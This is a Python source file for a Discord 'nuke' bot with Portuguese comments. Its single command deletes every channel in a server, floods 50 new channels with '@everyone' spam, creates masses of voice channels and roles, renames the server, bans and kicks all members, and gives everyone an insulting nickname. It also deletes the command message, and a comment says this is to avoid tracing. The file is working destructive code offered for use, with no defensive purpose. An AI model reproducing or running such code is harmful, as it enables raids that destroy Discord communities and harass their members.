from discord import Permissions
import discord, random, time
import json
from discord.ext import commands
import os
import colorama
import asyncio
from colorama import Fore
from discord import Embed

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=">", intents=intents)
bot.remove_command("help")

with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]

@bot.event
async def on_ready():
    print(f'''


     ________________   ______         
  ___\______  \_____  \ /  __  \___  ___
_/ ___\  /    //  ____/ >      <\  \/  /
\  \___ /    //       \/   --   \>    < 
 \___  >____/ \_______ \______  /__/\_ \
     \/               \/      \/      \/

   
Logged in and Ready <3                             
''')

async def spam_messages(channel):
    for _ in range(100):  # Envia 100 mensagens
        try:
            await channel.send("@everyone nukados by c728x kkkkkkkkkkkk")
            print(f"Sent message in {channel.name}")
            await asyncio.sleep(1)  # Intervalo de 1 segundo para evitar rate limits
        except:
            pass

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()  # Deleta o comando para evitar rastreamento

    # Deleta todos os canais
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except:
            pass

    # Cria 50 canais de texto e começa a spammá-los imediatamente
    spam_tasks = []
    for _ in range(50):  # Cria 50 canais de texto
        new_channel = await ctx.guild.create_text_channel(name="c728x lindo")
        print(f"Created text channel: {new_channel.name}")
        # Inicia o spam no canal criado
        spam_tasks.append(asyncio.create_task(spam_messages(new_channel)))

    # Cria 50 canais de voz
    for _ in range(50):  # Cria 50 canais de voz
        await ctx.guild.create_voice_channel(name="c728x passou aqui")
        print("Created voice channel")

    # Mudar o nome do servidor
    await ctx.guild.edit(name="@c728x nukou")
    print("Changed server name")

    # Spammar roles
    for _ in range(50):  # Cria 50 roles
        await ctx.guild.create_role(name="c728x nukou", colour=discord.Colour.random())
        print("Created role")

    # Banir todos os membros
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"Banned member: {member.name}")
        except:
            pass

    # Kickar todos os membros (caso o ban não funcione)
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(f"Kicked member: {member.name}")
        except:
            pass

    # Mudar o nickname de todos os membros
    for member in ctx.guild.members:
        try:
            await member.edit(nick="putinhas")
            print(f"Changed nickname of: {member.name}")
        except:
            pass

    # Aguarda todas as tarefas de spam terminarem
    await asyncio.gather(*spam_tasks)

    # Envia uma mensagem de confirmação
    embed = Embed(title="Server Nuked", description="All actions completed successfully.", color=0xaf1aff)
    await ctx.send(embed=embed)

bot.run(token)
